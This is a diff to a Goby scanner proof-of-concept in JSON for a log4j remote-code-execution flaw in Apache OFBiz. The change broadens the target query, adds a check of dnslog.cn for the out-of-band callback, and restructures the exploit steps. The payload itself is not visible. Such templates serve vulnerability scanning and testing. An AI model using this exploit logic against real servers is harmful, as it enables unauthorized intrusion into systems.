@@ -4,7 +4,7 @@
       "Tags": [
             "rce"
       ],
-      "GobyQuery": "(cert=\"ofbiz-vm\" | port=\"8443\" | protocol=\"https\")",
+      "GobyQuery": "(port=\"8443\" | protocol=\"https\")",
       "Description": "Apache OFBiz 存在log4j漏洞。",
       "Product": "Apache OFBiz",
       "Homepage": "https://ofbiz.apache.org/",
@@ -52,7 +52,6 @@
                         ]
                   },
                   "SetVariable": [
-                        "dnscookie|lastheader|regex|",
                         "dnstest|lastbody||"
                   ]
             },
@@ -80,6 +79,43 @@
             {
                   "Request": {
                         "method": "GET",
+                        "uri": "http://www.dnslog.cn/getrecords.php",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "contains",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "{{{dnstest}}}",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
                         "uri": "/webtools/control/main",
                         "follow_redirect": false,
                         "header": {
@@ -99,43 +135,6 @@
                   ]
             }
       ],
-      "ExploitSteps": [
-            "AND",
-            {
-                  "Request": {
-                        "method": "GET",
-                        "uri": "/test.php",
-                        "follow_redirect": true,
-                        "header": null,
-                        "data_type": "text",
-                        "data": "",
-                        "set_variable": []
-                  },
-                  "ResponseTest": {
-                        "type": "group",
-                        "operation": "AND",
-                        "checks": [
-                              {
-                                    "type": "item",
-                                    "variable": "$code",
-                                    "operation": "==",
-                                    "value": "200",
-                                    "bz": ""
-                              },
-                              {
-                                    "type": "item",
-                                    "variable": "$body",
-                                    "operation": "contains",
-                                    "value": "test",
-                                    "bz": ""
-                              }
-                        ]
-                  },
-                  "SetVariable": [
-                        "output|lastbody|regex|"
-                  ]
-            }
-      ],
-      "PostTime": "2022-01-04 13:35:47",
+      "PostTime": "2022-01-05 13:28:40",
       "GobyVersion": "1.9.320"
 }
